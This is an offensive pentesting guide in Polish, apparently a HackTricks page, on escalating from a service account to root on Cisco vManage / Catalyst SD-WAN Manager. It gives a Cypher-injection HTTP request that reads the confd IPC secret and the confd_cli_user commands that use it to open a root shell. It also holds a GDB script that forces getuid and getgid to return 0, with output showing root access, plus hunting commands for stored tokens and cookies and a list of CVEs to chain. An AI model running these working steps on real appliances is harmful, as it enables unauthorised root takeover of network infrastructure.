# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Gdy masz już code execution na Cisco vManage / *Catalyst SD-WAN Manager* jako `vmanage`, `netadmin` lub `vmanage-admin`, najciekawsze lokalne powierzchnie privesc to zwykle `confd` CLI stack, helper `cmdptywrapper`, localhost REST APIs oraz obsługujące import/upload handlery należące do root.

Jeśli nadal potrzebujesz **initial foothold** na kontrolerze, najpierw sprawdź dedykowaną stronę control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Jeśli `/etc/confd/confd_ipc_secret` jest czytelny z twojego foothold, Path 1 i Path 2 stają się natychmiast praktyczne.

## Path 1

(Przykład z [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Po przejrzeniu trochę [dokumentacji](http://66.218.245.39/doc/html/rn03re18.html) związanej z `confd` i różnymi binariami (dostępnej z kontem na stronie Cisco), odkryliśmy, że do uwierzytelniania socket IPC używa sekretu znajdującego się w `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Pamiętasz naszą instancję Neo4j? Działa ona z uprawnieniami użytkownika `vmanage`, co pozwala nam pobrać plik przy użyciu poprzedniej podatności:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` nie obsługuje argumentów wiersza poleceń, ale wywołuje `/usr/bin/confd_cli_user` z argumentami. Możemy więc bezpośrednio wywołać `/usr/bin/confd_cli_user` z własnym zestawem argumentów. Jednak nie jest on czytelny przy naszych obecnych uprawnieniach, więc musimy pobrać go z rootfs i skopiować za pomocą scp, przeczytać help i użyć go, aby uzyskać shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Przykład z [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ zespołu synacktiv opisał elegancki sposób na uzyskanie root shell, ale jest jeden haczyk: wymaga to zdobycia kopii `/usr/bin/confd_cli_user`, która jest czytelna tylko dla root. Znalazłem inny sposób na eskalację do root bez takiego zachodu.

Gdy zdekodowałem binarkę `/usr/bin/confd_cli`, zaobserwowałem następujące:

<details>
<summary>Objdump pokazujący zbieranie UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Gdy uruchamiam “ps aux”, zaobserwowałem następujące (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Zasugerowałem, że program “confd_cli” przekazuje identyfikator użytkownika i identyfikator grupy, które pobrał od zalogowanego użytkownika, do aplikacji “cmdptywrapper”.

Moją pierwszą próbą było uruchomienie “cmdptywrapper” bezpośrednio i podanie mu `-g 0 -u 0`, ale to się nie powiodło. Wygląda na to, że gdzieś po drodze został utworzony deskryptor pliku (-i 1015) i nie mogę go podrobić.

Jak wspomniano w blogu synacktiv (ostatni przykład), program “confd_cli” nie obsługuje argumentów wiersza poleceń, ale mogę wpływać na niego za pomocą debuggera i na szczęście GDB jest zainstalowany w systemie.

Utworzyłem skrypt GDB, w którym wymusiłem, aby API `getuid` i `getgid` zwracały 0. Ponieważ mam już uprawnienia “vmanage” poprzez deserialization RCE, mam bezpośrednie uprawnienie do odczytu `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Wyjście konsoli</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Ścieżka 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco później udokumentowało czystszą lokalną ścieżkę do roota w swoim własnym advisory dla [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **uwierzytelniony attacker z wyłącznie uprawnieniami read-only** mógł wysłać spreparowane żądanie do manager CLI i przeskoczyć do root z powodu niewystarczającej walidacji wejścia.

Z ofensywnej perspektywy najważniejszy wniosek jest taki:

1. Gdy masz już *jakikolwiek* niski foothold na maszynie, powinieneś przetestować lokalny serwis CLI, zanim przejdziesz do cięższego workflow Ścieżka 1 / Ścieżka 2.
2. Ponownie użyj artefaktów ze Ścieżka 2, aby znaleźć granicę zaufania: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Traktuj każde pole przekazywane do backendu CLI jako podejrzane: UID/GID, username, metadane terminala, importowane pliki albo dowolną wartość później konsumowaną przez helper należący do root.
4. Jeśli użytkownik z niskimi uprawnieniami może dotrzeć do lokalnego socket CLI i wpływać na te pola, root może być tylko o jedno spreparowane żądanie dalej.

Praktyczny workflow po uzyskaniu dostępu do appliance jest:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
To zamienia błąd z 2025 roku w dobry wzorzec polowania na podobne wersje: szukaj **lokalnych CLI shimów, które zbierają tożsamość w userland i przekazują ją do bardziej uprzywilejowanego wrappera**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Lutowa advisory Cisco z 2026 roku wprowadziła też inną przydatną klasę privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) pozwalało **uwierzytelnionemu, lokalnemu atakującemu z niskimi uprawnieniami** uzyskać root z powodu niewystarczającego mechanizmu uwierzytelniania użytkownika w REST API.

To ma znaczenie, ponieważ privesc w vManage nie ogranicza się już tylko do nadużyć `confd`/TTY. Po uzyskaniu low-priv shella szukaj też:

- endpointów API dostępnych tylko z localhost, które zbyt mocno ufają wywołującemu
- tokenów, cookies albo service credentials możliwych do odczytania z bieżącego konta
- akcji tylko dla root udostępnionych przez handlery `dataservice`/REST, które nadal można wywołać lokalnie

W praktyce, gdy masz shell jako `vmanage` lub inny service user, nadużycie lokalnego API jest często cichsze i łatwiejsze do zautomatyzowania niż interaktywne nadużycie CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Jeśli lokalny kontekst sesji wystarcza, aby trafić w uprzywilejowaną funkcjonalność REST, preferuj ścieżkę API: łatwiej ją odtwarzać, automatyzować i łączyć ze skradzionymi sesjami webowymi lub tokenami API.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Innym recent wzorcem jest [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalny attacker z uprawnieniami `netadmin` mógł uploadować **crafted file**, który CLI później obsłużyło niebezpiecznie, prowadząc do command injection jako `root`.

Z punktu widzenia HackTricks, wartościowa technika jest szersza niż konkretny CVE:

1. Wylicz każdy workflow CLI lub web, który akceptuje plik: importy, pakiety diagnostyczne, szablony, walidatory, backupy, dane tenantów itd.
2. Prześledź, gdzie trafia uploadowany plik i który root-owned script lub binary go konsumuje.
3. Sprawdź, czy nazwa pliku, zawartość pliku lub sparsowane metadata są kiedykolwiek przekazywane do shell commands, wrapper scripts lub helperów w stylu `system()`.
4. Jeśli już możesz osiągnąć `netadmin` (valid creds, stolen session lub łańcuch auth-bypass), bugs związane z przetwarzaniem plików często są najszybszą drogą do root.

Ta klasa bugów szczególnie dobrze łączy się z remote footholds, które dają `netadmin`, ale nie `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – ukradnij sesję admina w web UI, a następnie pivotuj do działań API/CLI, które ostatecznie prowadzą do `vshell` albo jednej z lokalnych ścieżek privesc powyżej.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – bardzo silny precursor dla Path 5, ponieważ `netadmin` to dokładnie poziom wymagany przez 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – przydatne do zrzucania plików, które później są parsowane przez privileged components, albo do nadpisywania operational artifacts używanych przez root-owned helpers.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – lepiej opisane na dedykowanej stronie SD-WAN control-plane; może dołączyć SSH key dla `vmanage-admin`, dając lokalny foothold potrzebny, aby wrócić do tej strony.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
